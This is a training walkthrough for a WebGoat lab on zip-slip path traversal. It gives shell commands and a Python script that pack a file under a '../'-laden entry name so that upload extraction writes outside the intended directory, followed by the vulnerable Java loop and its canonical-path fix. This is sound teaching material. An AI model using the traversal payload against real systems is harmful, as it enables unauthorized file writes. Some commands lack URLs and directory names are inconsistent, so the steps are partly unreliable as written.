---
title: "A3:2021 | Path Transversal (8) | Cycubix Docs"
layout: default
nav_order: 8
parent: "A3:2021 | Path Transversal | Cycubix Docs"
grand_parent: "A3:2021 | Injection | Cycubix Docs"
---
# A3:2021 | Path Transversal (8) | Cycubix Docs

#### Solution <a href="#solution" id="solution"></a>

* As mentioned in the previous page, this is what happens when you create a zip file with an image inside: 

```
curl -o webwolf.jpg
zip profile.zip webwolf.jpg
```

Now let’s upload this as our profile image. We can see nothing happens as mentioned in the assignment there is a bug in the software, and the result we see on the screen is:

```
Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.
```

Let’s create a zip file that traverses to the top and then back into the given directory in the assignment.

* First, create the directory structure:

```
mkdir -p /home/webgoat/.webgoat-2023.8/PathTraversal/webgoattest7
cd /home/webgoat/.webgoat-2023.8/PathTraversal/webgoattest7
curl -o webgoattest7.jpg
zip profile.zip ../../../../../../../../home/webgoat/.webgoat-2023.8/PathTraversal/webgoattest7/webgoattest7.jpg
```

Now, if we upload this zip file, it solves the assignment.

**Troubleshooting with PowerShell**

* Create the directory with the following code:

```
mkdir C:\WebGoat\PathTraversal\username
cd C:\WebGoat\PathTraversal\username
```

* Download the image:

```
curl -o username.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png
```

* Create the Zip file with File Transversal: 

```
import zipfile
import os

zip_path = r'C:\WebGoat\PathTraversal\luzclarita7\profile.zip'
file_to_add = r'C:\WebGoat\PathTraversal\luzclarita7\luzclarita7.jpg'
traversal_path = r'..\..\..\..\..\..\..\..\WebGoat\PathTraversal\luzclarita7\luzclarita7.jpg'

with zipfile.ZipFile(zip_path, 'w') as zip_file:
    zip_file.write(file_to_add, traversal_path)
```

* Run the script command: 

```
python create_zip.py
```

* Upload profile.zip into the previous lesson. 

#### Why did this work? <a href="#why_did_this_work" id="why_did_this_work"></a>

In the code, the developers used the following fragment:

```
ZipFile zip = new ZipFile(uploadedZipFile);
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
  ZipEntry e = entries.nextElement();
  File profilePicture = new File(uploadDirectory, e.getName());
  InputStream is = zip.getInputStream(e);
  Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
```

The fix is to make sure the resulting file in line 5 resides in the directory you expect. Same as with the path traversal mitigation, use `profilePicture.getCanonicalPath()` to ensure the path is the same as you expect it to be.

The `getCanonicalPath()` method resolves the absolute path, eliminating any path traversal sequences.

The `getCanonicalPath()` method resolves the absolute path, eliminating any path traversal sequences.
